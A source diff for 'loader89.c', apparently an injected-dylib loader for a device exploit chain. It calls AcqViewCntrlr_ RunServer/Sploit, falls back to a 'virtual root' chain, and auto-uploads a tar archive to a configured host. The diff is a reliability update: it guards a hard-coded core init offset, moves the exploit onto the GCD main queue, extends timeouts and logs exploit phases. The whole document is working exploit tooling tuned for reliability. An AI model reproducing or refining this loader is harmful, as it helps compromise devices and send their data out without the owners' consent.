@@ -1,7 +1,10 @@
-/* loader89.c - 89yl 双链路加载器 v4
+/* loader89.c - 89yl 双链路加载器 v6.0 (onemain-noinit-clash)
  * exploit chain: AcqViewCntrlr_ RunServer + Sploit
  * MHA/MCM fallback chain: libuiopsersvc `_mcm_filza_run` -> virtual root
  * Both chains write a real tar archive and auto-upload it.
+ * v6.0 fix A: core sink init (0x59fa28) is one-shot per process (atomic guard).
+ * v6.0 fix B: direct exploit fallback prefers the GCD main queue (dlsym'd),
+ *             pthread only as fallback; parent wait budget 60s @ 250ms.
  */
 typedef unsigned long u64;
 typedef long long i64;
@@ -72,10 +75,27 @@ static char g_sts_statuspath[512];
 static int g_logfd = -1;
 /* v5.8 problem B fix: fallback thread reads this static struct,
  * the old stack-local copy was a dangling-pointer risk. */
+/* v5.10 fix (audit): confirmed the direct-fallback worker passes only
+ * this static global struct to the detached exploit thread; no new
+ * stack-local struct is handed to any thread, so no dangling reference. */
 static struct exploit_thread_args {
     void *acqCls;
     void *core;
 } g_exploit_args;
+/* v6.0 fix A: process-wide one-shot guard for the core sink init call
+ * (core+0x59fa28). 0 = never attempted, 1 = some thread is inside the
+ * init right now, 2 = completed. V59 hung 12s after "InitLogs before"
+ * because the app's own init flow and the direct-fallback thread could
+ * both reach 0x59fa28 and double-initialize the core logger
+ * (__cxa_guard / mutex clash). With this guard 0x59fa28 runs at most
+ * once per process, and any second caller only probes the vtable. */
+static volatile int g_sink_init_guard = 0;
+/* v6.0 fix B: GCD entry points resolved via dlsym (same pattern as the
+ * objc pointers below) so we add no <dispatch/dispatch.h> include and
+ * keep the injected-dylib compile environment unchanged. If resolution
+ * fails we fall back to the plain pthread path with a warn line. */
+static void *(*p_get_main_queue)(void);
+static void (*p_dispatch_async_f)(void *, void *, void (*)(void *));
 static char g_logpath[512];
 static char g_host[128];
 static int g_port = LOADER89_DEFAULT_PORT;
@@ -460,9 +480,22 @@ static int resolve_core_base(void *core, unsigned char **out_base) {
 
 static void repair_core_log_sink(void *core) {
     if (!core) return;
+    /* v6.0 fix A: one-shot, process-wide. If another thread (the app's own
+     * init flow after dlopen(core)) already owns or finished the 0x59fa28
+     * init, NEVER call it again - concurrent double-init of the core logger
+     * is the top suspect for the V59 12s hang. We only probe the vtable. */
+    if (!__sync_bool_compare_and_swap(&g_sink_init_guard, 0, 1)) {
+        unsigned char *b = 0;
+        if (resolve_core_base(core, &b) && *(void **)(b + 0x6ca1b8))
+            log_info("core sink vtable OK (init done elsewhere; v6.0 fix A)");
+        else
+            log_warn("core sink init owned by another thread; skip 0x59fa28 (v6.0 fix A)");
+        return;
+    }
     unsigned char *base = 0;
     if (!resolve_core_base(core, &base)) {
         log_info("core sink repair SKIPPED (no base); continue");
+        g_sink_init_guard = 2;
         return;
     }
     void **sink = (void **)(base + 0x6ca1b8);
@@ -471,12 +504,15 @@ static void repair_core_log_sink(void *core) {
     snprintf(msg, sizeof(msg), "core sink before vtable=%p slot=%p", *sink, (void *)*slot);
     log_info(msg);
     if (*sink) {
+        /* v6.0 fix A rule: vtable non-zero -> never call 0x59fa28. */
         log_info("core sink vtable OK");
+        g_sink_init_guard = 2;
         return;
     }
     void (*init_sink)(void) = (void (*)(void))(base + 0x59fa28);
-    log_info("core sink vtable ZERO; running init 0x59fa28");
+    log_info("core sink vtable ZERO; running init 0x59fa28 (once per process; v6.0 fix A)");
     init_sink();
+    g_sink_init_guard = 2;
     snprintf(msg, sizeof(msg), "core sink after vtable=%p slot=%p", *sink, (void *)*slot);
     log_info(msg);
 }
@@ -519,18 +555,24 @@ struct exploit_status {
     int core_base_resolved;
     int raw_flag;      /* -1 = unreadable, otherwise raw value at flag addr */
     int succeeded;     /* 1 only when core_base_resolved && raw_flag == 0 */
+    char phase[16];    /* v6.0: "initlogs" / "runserver" / "sploit" / "done" */
+    long phase_ts;     /* v6.0: unix ts when the current phase was entered */
 };
 
-static struct exploit_status g_exploit_sts = {0, 0, 0, -1, 0};
+static struct exploit_status g_exploit_sts = {0, 0, 0, -1, 0, "", 0};
 
 /* v5.8 problem C fix: child writes a status file; parent reads it
  * instead of guessing success from the exit code alone. */
 static void write_child_status(void) {
     if (!g_sts_statuspath[0]) return;
     char buf[512];
+    char ephase[32];
+    json_escape(ephase, sizeof(ephase), g_exploit_sts.phase);
     int n = snprintf(buf, sizeof(buf),
-        "{\"sploit_done\":%d,\"runserver_done\":%d,\"core_base_resolved\":%d,"
+        "{\"phase\":\"%s\",\"phase_ts\":%ld,"
+        "\"sploit_done\":%d,\"runserver_done\":%d,\"core_base_resolved\":%d,"
         "\"raw_flag\":%d,\"success\":%d}",
+        ephase, g_exploit_sts.phase_ts,
         g_exploit_sts.sploit_done, g_exploit_sts.runserver_done,
         g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag, g_exploit_sts.succeeded);
     if (n <= 0) return;
@@ -545,6 +587,36 @@ static void write_child_status(void) {
     close(fd);
 }
 
+/* v6.0: enter a new exploit phase, stamp it, and persist immediately.
+ * Used by BOTH paths (fork child and direct in-process fallback) because
+ * both run exploit_class_main, so the status file keeps one unified format. */
+static void set_exploit_phase(const char *phase) {
+    snprintf(g_exploit_sts.phase, sizeof(g_exploit_sts.phase), "%s", phase);
+    g_exploit_sts.phase_ts = (long)time(0);
+    write_child_status();
+}
+
+/* v6.0: lightweight phase-only read for the 250ms poller; does not touch
+ * g_exploit_sts booleans and does not log, so it cannot spam or clobber. */
+static int read_status_phase(char *out, unsigned long outn) {
+    out[0] = 0;
+    if (!g_sts_statuspath[0]) return 0;
+    int fd = open(g_sts_statuspath, O_RDONLY);
+    if (fd < 0) return 0;
+    char buf[512];
+    long n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0) return 0;
+    buf[n] = 0;
+    const char *v = strstr(buf, "\"phase\":\"");
+    if (!v) return 0;
+    v += 9;
+    unsigned long i = 0;
+    while (v[i] && v[i] != '"' && i + 1 < outn) { out[i] = v[i]; i++; }
+    out[i] = 0;
+    return out[0] != 0;
+}
+
 /* v5.8: parent side — parse the child's status JSON. We only need
  * booleans; simple "key":N matching is enough and stays dependency-free. */
 static int read_child_status(void) {
@@ -554,6 +626,8 @@ static int read_child_status(void) {
     g_exploit_sts.raw_flag = -1;
     g_exploit_sts.sploit_done = 0;
     g_exploit_sts.runserver_done = 0;
+    g_exploit_sts.phase[0] = 0;
+    g_exploit_sts.phase_ts = 0;
     int fd = open(g_sts_statuspath, O_RDONLY);
     if (fd < 0) return 0;
     char buf[512];
@@ -562,6 +636,17 @@ static int read_child_status(void) {
     if (n <= 0) return 0;
     buf[n] = 0;
     const char *v;
+    /* v6.0: parse the phase field too, so the parent-side g_exploit_sts
+     * mirrors the writer's format ("phase":"initlogs"/"runserver"/
+     * "sploit"/"done" + phase_ts). Older files without phase keep the
+     * previous behaviour (empty phase), i.e. format stays compatible. */
+    if ((v = strstr(buf, "\"phase\":\""))) {
+        v += 9;
+        unsigned long k = 0;
+        while (v[k] && v[k] != '"' && k + 1 < sizeof(g_exploit_sts.phase)) { g_exploit_sts.phase[k] = v[k]; k++; }
+        g_exploit_sts.phase[k] = 0;
+    }
+    if ((v = strstr(buf, "\"phase_ts\":"))) g_exploit_sts.phase_ts = (long)atoi(v + 11);
     if ((v = strstr(buf, "\"core_base_resolved\":"))) g_exploit_sts.core_base_resolved = atoi(v + 20);
     if ((v = strstr(buf, "\"raw_flag\":"))) g_exploit_sts.raw_flag = atoi(v + 11);
     if ((v = strstr(buf, "\"sploit_done\":"))) g_exploit_sts.sploit_done = atoi(v + 14);
@@ -589,19 +674,23 @@ static int exploit_class_main(void *acqCls, void *core) {
      * All three take no arguments (v16@0:8). */
     void *inst = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
     if (!inst) { log_error("AcqViewCntrlr_ alloc/init returned nil"); return 3; }
+    set_exploit_phase("initlogs");   /* v6.0: phase progress + ts to status file */
     log_info("InitLogs before");
     p_msgSend(inst, p_sel("InitLogs"));
     log_info("InitLogs after");
+    set_exploit_phase("runserver");
     log_info("RunServer before");
     p_msgSend(inst, p_sel("RunServer"));
     g_exploit_sts.runserver_done = 1;
     g_exploit_sts.succeeded |= exploit_core_ok(core, &g_exploit_sts.raw_flag, &g_exploit_sts.core_base_resolved);
     log_info("RunServer after");
+    set_exploit_phase("sploit");
     log_info("Sploit before");
     p_msgSend(inst, p_sel("Sploit"));
     log_info("Sploit after");
     g_exploit_sts.sploit_done = 1;
     g_exploit_sts.succeeded |= exploit_core_ok(core, &g_exploit_sts.raw_flag, &g_exploit_sts.core_base_resolved);
+    set_exploit_phase("done");
     int ok = g_exploit_sts.succeeded;
     char msg[220];
     snprintf(msg, sizeof(msg), "exploit class-chain result succeeded=%d resolved=%d raw=%d", ok,
@@ -616,6 +705,10 @@ static int exploit_class_main(void *acqCls, void *core) {
 
 static void *exploit_thread_worker(void *arg) {
     struct exploit_thread_args *a = (struct exploit_thread_args *)arg;
+    /* v6.0 fix A: ensure the core sink exists before InitLogs, but never
+     * double-init - if the vtable is already non-zero (or another thread
+     * owns the init) the guard inside skips 0x59fa28 entirely. */
+    repair_core_log_sink(a->core);
     int rc = exploit_class_main(a->acqCls, a->core);
     write_child_status();
     g_exploit_state = (rc == 0) ? EXPLOIT_ST_OK : EXPLOIT_ST_FAIL;
@@ -997,6 +1090,11 @@ static void *worker(void *arg) {
     p_nslog = (void *(*)())dlsym(RTLD_DEFAULT, "NSLog");
     p_retain = (void *(*)(void *))dlsym(RTLD_DEFAULT, "objc_retain");
     p_release = (void *(*)(void *))dlsym(RTLD_DEFAULT, "objc_release");
+    /* v6.0 fix B: GCD resolved dynamically with the exact same dlsym
+     * pattern as the objc pointers above (dlsym adds the leading
+     * underscore itself); no <dispatch/dispatch.h> include needed. */
+    p_get_main_queue = (void *(*)(void))dlsym(RTLD_DEFAULT, "dispatch_get_main_queue");
+    p_dispatch_async_f = (void (*)(void *, void *, void (*)(void *)))(dlsym(RTLD_DEFAULT, "dispatch_async_f"));
     if (!p_msgSend || !p_getClass || !p_sel || !p_release) { log_error("objc runtime missing"); return 0; }
 
     if (g_logfd >= 0) {
@@ -1008,7 +1106,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v5.9 instance-method-chain start ===");
+    log_info("=== loader89 v6.0 onemain-noinit-clash start ===");
     read_runtime_config();
     {
         /* v5.8 problem C: child/worker exploit state goes to this file;
@@ -1083,13 +1181,25 @@ static void *worker(void *arg) {
             write_child_status();
             _exit(rc);
         } else if (child > 0) {
-            snprintf(msg, sizeof(msg), "exploit child pid=%d timeout=12s", (int)child);
+            /* v6.0: parent wait budget raised 12s -> 60s, granularity
+             * 250ms (240 x usleep(250000)); phase transitions from the
+             * child's status file are logged as they happen so a hang can
+             * be pinned to initlogs/runserver/sploit from the log alone. */
+            snprintf(msg, sizeof(msg), "exploit child pid=%d timeout=60s", (int)child);
             log_info(msg);
             int status = 0, finished = 0;
-            for (int i = 0; i < 12; i++) {
+            char last_phase[16] = "";
+            char cur_phase[16];
+            for (int i = 0; i < 240; i++) {
                 pid_t got = waitpid(child, &status, WNOHANG);
                 if (got == child) { finished = 1; break; }
-                sleep(1);
+                usleep(250000);
+                if (read_status_phase(cur_phase, sizeof(cur_phase)) &&
+                    cur_phase[0] && strcmp(cur_phase, last_phase) != 0) {
+                    snprintf(msg, sizeof(msg), "exploit child phase=%s elapsed=%ds", cur_phase, (i + 1) / 4);
+                    log_info(msg);
+                    snprintf(last_phase, sizeof(last_phase), "%s", cur_phase);
+                }
             }
             if (!finished) {
                 kill(child, SIGKILL);
@@ -1188,14 +1298,50 @@ static void *worker(void *arg) {
          * thread never touches stack memory that dies when we return. */
         g_exploit_args.acqCls = acqCls;
         g_exploit_args.core = core;
-        void *th = 0;
         g_exploit_state = EXPLOIT_ST_RUN;
-        log_info("direct exploit fallback start");
-        if (pthread_create(&th, 0, exploit_thread_worker, &g_exploit_args) == 0) {
-            pthread_detach(th);
-            for (int i = 0; i < 12 && g_exploit_state == EXPLOIT_ST_RUN; i++) sleep(1);
+        int launched = 0;
+        log_info("direct exploit fallback start (budget=60s, poll=250ms)");
+        /* v6.0 fix B: prefer the GCD main queue for the alloc/init ->
+         * InitLogs -> RunServer -> Sploit chain (suspicion: some step
+         * needs main-thread-only machinery and blocks forever on a plain
+         * pthread). dispatch_async_f takes a plain C callback, so we can
+         * dlsym it exactly like the objc pointers - no headers needed.
+         * If dlsym failed we log one warn and keep the old pthread path. */
+        if (p_get_main_queue && p_dispatch_async_f) {
+            void *mq = p_get_main_queue();
+            if (mq) {
+                log_info("direct exploit via GCD main queue (v6.0 fix B)");
+                p_dispatch_async_f(mq, &g_exploit_args, (void (*)(void *))exploit_thread_worker);
+                launched = 1;
+            }
+        }
+        if (!launched) {
+            log_warn("GCD main queue unavailable; pthread direct exploit fallback (v6.0 fix B)");
+            void *th = 0;
+            if (pthread_create(&th, 0, exploit_thread_worker, &g_exploit_args) == 0) {
+                pthread_detach(th);
+                launched = 1;
+            }
+        }
+        if (launched) {
+            /* v6.0: total budget raised 12s -> 60s; poll every 250ms so
+             * phase changes reach the status file and get logged promptly.
+             * Sploit's internal viability+exploit (core 0x82f0) may take
+             * tens of seconds; 12s was premature. */
+            char last_phase[16] = "";
+            char cur_phase[16];
+            for (int i = 0; i < 240 && g_exploit_state == EXPLOIT_ST_RUN; i++) {
+                usleep(250000); /* 250ms */
+                if (read_status_phase(cur_phase, sizeof(cur_phase)) &&
+                    cur_phase[0] && strcmp(cur_phase, last_phase) != 0) {
+                    /* log each phase transition only once (dedup via last_phase) */
+                    snprintf(msg, sizeof(msg), "direct exploit phase=%s elapsed=%ds", cur_phase, (i + 1) / 4);
+                    log_info(msg);
+                    snprintf(last_phase, sizeof(last_phase), "%s", cur_phase);
+                }
+            }
             if (g_exploit_state == EXPLOIT_ST_RUN) {
-                log_warn("direct exploit fallback TIMEOUT; continuing MHA/upload");
+                log_warn("direct exploit fallback TIMEOUT (60s); continuing MHA/upload");
                 exploit_ok = 0;
             } else {
                 read_child_status();
